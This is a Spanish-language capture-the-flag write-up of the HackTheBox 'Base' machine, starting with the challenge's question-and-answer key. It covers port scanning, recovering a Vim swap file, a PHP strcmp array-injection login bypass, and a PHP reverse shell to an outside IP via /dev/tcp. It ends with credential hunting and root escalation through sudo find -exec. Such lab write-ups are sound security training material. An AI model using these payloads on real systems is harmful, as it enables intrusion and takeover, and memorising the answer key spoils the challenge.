1)¿Qué dos puertos TCP están abiertos en el host remoto?
	22,80

2)¿Cuál es la ruta relativa en el servidor web para la página de inicio de sesión?
	/login/login.php

3)¿Cuántos ficheros hay en el directorio «/login»?
	3
	![[Base5.png]]

4)¿Cuál es la extensión de un archivo swap?
	.swp
	
5)¿Qué función PHP se utiliza en el código backend para comparar el nombre de usuario y la contraseña enviados por el usuario con el nombre de usuario y la contraseña válidos?
	strcmp()

6)¿En qué directorio se almacenan los archivos cargados?
	\_uploaded

7)¿Qué usuario existe en el host remoto con un directorio home?
	john

8)¿Cuál es la contraseña del usuario presente en el sistema?
	thisisagoodpassword

9)¿Cuál es la ruta completa del comando que el usuario john puede ejecutar como usuario root en el host remoto?
	/usr/bin/find

10)¿Qué acción puede utilizar el comando find para ejecutar comandos?
	exec


-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.95.184
nmap -p- --open -vvv --min-rate 5000 -sS -n -Pn 10.129.95.184 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.129.95.184 -oN target
```


![[Base1.png]]
![[Base2.png]]
*TTL:* Maquina linux
*Puertos:*
`22`SSH
`80`HTTP

--------
# [[Enumeracion con pequeño script de NMAP y Whatweb-wappalyzer]]

```shell
whatweb http://10.129.95.184/
nmap --script http-enum -p80 10.129.95.184 -oN webScan
```
![[Base3.png]]![[Base4.png]]
Nos informa que es un apache, tambien el dominio base.htb

-------
# [[Array Injection]]
Entramos a la parte de login y vemos que esta dentro de un directorio /login

![[Base7.png]]
Asi que vamos a ese directorio y descargamos el archivo .swp(Explicado en notas que son los .swp)
![[Base6.png]]
Ahora si cateamos el archivo nos va a aparecer que es un binario. Lo que vamos a hacer es abrirlo con ``nvim login.php.swp``

![[Base8.png]]
y vemos que tiene muchas cadenas que no se pueden leer
![[Base9.png]]
Asi que vamos a usar el comando [[strings]] para sacar las cadenas legibles y el output lo voy a poner en un archivo que se llama loginlimpio.txt `strings login.php.swp > loginlimpio.txt`
![[Base10.png]]
y ahora lo abrimos con `cat loginlimpio.txt -l java` 
	Aclaracion: Si bien no es java el lenguaje, usa los colores bastante bien para separarlo y entender mejor el codigo
	
![[Base11.png]]

Despues de analizar el archivo, podemos ver en esta parte que antes de hacer la validacion del usuario y contraseña nos brinda las cookies. Y a la vez por como esta estructurada la comparacion poniendole [] para hacerlo arrays podemos romper la comparativa y ingresar con cualquier usuario y contraseña
```
header("Location: /upload.php");
  72   │             $_SESSION['user_id'] = 1;
  73   │         if (strcmp($password, $_POST['password']) == 0) {
  74   │     if (strcmp($username, $_POST['username']) == 0) {
  75   │     require('config.php');
  76   │ if (!empty($_POST['username']) && !empty($_POST['password'])) {
  77   │ session_start();
```

Interceptamos con burpsuite la peticion

![[Base12.png]]
Y cambiamos la ultima linea por `username[]=test&password[]=pass` 
Asi ganamos acceso a la pagina upload.php
![[Base13.png]]

----------
# [[Arbitrary file upload]]

Con el diccionario de seclists no vamos a encontrar nunca el directorio donde se suben los archivos que es http://10.129.95.184/_uploaded/ ya que la palabra uploaded no aparece en los diccionarios. Para poder encontrarla podemos añadir esta palabra, asi ya lo tenemos en un futuro con el comando `echo "_uploaded" | sudo tee -a /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` que va a añadir en la ultima linea la palabra

Vamos a usar [[Gobuster]] para enumerar directorios `gobuster dir -u http://10.129.95.184/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt --add-slash -t 60`
![[Base15.png]]
### Sacamos una [[Reverse shell]] 
Creamos un archivo con nombre rever.php
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.21/443 0>&1'");
?>
```

Mientras estamos en escucha con [[nc -nlvp 443]], vamos a abrir el archivo desde http://10.129.95.184/_uploaded/rever.php
![[Base14.png]]
Y ya estamos adentro de la maquina

--------------
# [[Tratamiento de la TTY]]

-------
# Escalada al usuario john

Buscamos con [[grep]]`grep -riE "password|.*password|password.*" ` desde el directorio /var/www/html/login
Y encontramos la contraseña *thisisagoodpassword*
![[Base16.png]]

### Conexion por [[ssh]]
```shell
ssh john@10.129.95.184 -p 22
```
![[Base18.png]]

------
# Escalada de privilegios a root con [[Abuso de Sudo]]

Con `sudo -l` vemos que el binario /usr/bin/find se ejecuta como root
![[Base19.png]]

[Articulo de gtfobinds donde se saco esto](https://gtfobins.github.io/gtfobins/find/#suid)
```
sudo /usr/bin/find . -exec /bin/bash -p \; -quit
```
![[Base20.png]]

----------
# Notas

Los archivos `.swp` los crea Vim para guardar cambios temporales mientras editás, permitiendo recuperar datos si se cierra inesperadamente. También evitan que se edite el mismo archivo desde dos lugares a la vez. Podés borrarlos si estás seguro de que Vim ya no está usando el archivo.


---------
# Creditos
Writeup oficial HackTheBox